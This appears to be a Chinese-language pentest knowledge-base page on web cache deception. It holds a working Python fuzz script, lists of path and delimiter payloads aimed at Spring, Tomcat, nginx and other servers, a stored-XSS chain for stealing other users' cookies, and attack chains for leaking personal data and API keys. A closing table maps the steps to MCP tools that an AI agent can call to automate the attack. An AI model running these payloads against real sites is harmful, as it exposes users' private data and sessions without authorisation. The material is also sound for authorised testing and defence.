# Web Cache Deception

## 原理

CDN/缓存把 URL 以 `.css`、`.js` 结尾的响应当作静态资源缓存。攻击者在敏感 URL 后附加静态扩展名，诱导缓存把动态页面当作静态文件存下来 → 其他用户访问同一 URL → 拿到缓存的敏感数据。

```
GET /account/settings.css  → CDN 认为这是 CSS → 缓存
                            → 实际后端是 /account/settings → 动态页面
                            → 缓存中存了用户的个人信息
```

## 基础 Payload

```python
# 缓存欺骗 fuzz 脚本
import requests

DECEPTION_PAYLOADS = [
    # 基础静态扩展
    "/account/settings.css",
    "/account/settings.js",
    "/account/settings.json",
    "/account/settings.png",
    "/account/settings.jpg",
    "/account/settings.html",
    "/account/settings.ico",
    "/account/settings.xml",
    "/account/settings.txt",
    "/account/settings.pdf",

    # 分隔符变体 (绕过路径规范化)
    "/account/settings;.css",       # Spring: ; 是路径参数 → /account/settings 处理
    "/account/settings%3b.css",     # 编码分号
    "/account/settings%00.css",     # NUL byte → OpenLiteSpeed 截断为 /account/settings
    "/account/settings..;.css",     # 某些路径规范化变体

    # 路径穿越变体
    "/account%2f..%2fstatic%2f..%2fsettings.css",
    "/account/..;/static/..;/settings.css",

    # 查询参数
    "/account/settings?fake=css",
    "/account/settings.css?v=1",

    # 大小写
    "/account/settings.CSS",
    "/account/settings.JsOn",
]

def detect_deception(target: str, session_cookie: str = ""):
    """测试缓存欺骗漏洞"""
    for payload in DECEPTION_PAYLOADS:
        headers = {}
        if session_cookie:
            headers["Cookie"] = session_cookie

        r = requests.get(f"https://{target}{payload}", headers=headers)

        # 检查是否被缓存
        cache_hit = r.headers.get("X-Cache", "").lower()
        cf_cache = r.headers.get("Cf-Cache-Status", "").lower()

        if "hit" in cache_hit or "hit" in cf_cache:
            print(f"[!] CACHED: {payload}")
            # 用无 cookie 的请求验证 → 看是否能读到认证后的数据
            r2 = requests.get(f"https://{target}{payload}")
            if len(r2.text) > 500 and "account" in r2.text.lower():
                print(f"    [!] DECEPTION CONFIRMED: unauthenticated gets auth data")
```

## Web Cache Deception + Delimiter

```python
# 利用不同服务器对分隔符的理解差异

# Spring Boot: ; 是 matrix variable
# GET /account;.css → 路由到 /account → 返回敏感数据
# CDN 看到 .css → 缓存
DELIMITER_PAYLOADS = {
    "spring": "/private;.css",
    "rails": "/private.json",  # Rails 用 .format
    "play": "/private.css",
    "express": "/private%2f..%2fstatic%2f..%2fprivate.css",
    "iis": "/private.aspx.css",
    "tomcat": "/private;.css",
    "nginx": "/private%00.css",   # NUL 截断?
}
```

## Stored XSS via Cache Deception

```python
# 1. 在你的账户中存 XSS payload (如个人简介)
# 2. 访问 /profile/attacker.json → CDN 缓存 (含 XSS)
# 3. 诱导他人访问 /profile/attacker.json → CDN serve 含 XSS 的缓存
# 4. XSS 在 target.com origin 下执行 → 读取他人 cookie
```

## 与 Cache Poisoning 的区别

```
Cache Deception: URL 欺骗 → 缓存动态页面 → 泄露数据
Cache Poisoning:  注入 unkeyed header → 缓存恶意响应 → XSS/redirect
```

## 攻击链

```
Cache Deception → /account.css → 缓存别人 profile → PII 泄露
Cache Deception → /admin/config.js → 缓存管理配置 → API key 泄露
Cache Deception → XSS payload 缓存 → Stored XSS on CDN → 全站攻击
Cache Deception + delimiter → ;.css bypass → 绕过 URL 规范化 → 更多页面可缓存
Cache Deception + crawl → 搜索爬虫 → CDN 预热恶意缓存 → 被动攻击
```

## Evidence

记录: 缓存命中的 URL、缓存前响应 vs 缓存后响应 diff、X-Cache/X-Cache-Status header、无认证可读取的数据

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| Web 缓存欺骗探测 | `http_probe` | HTTP GET 探测缓存机制和欺骗入口 |
| 知识检索 | `kb_router` | 按缓存欺骗信号搜索知识库 |
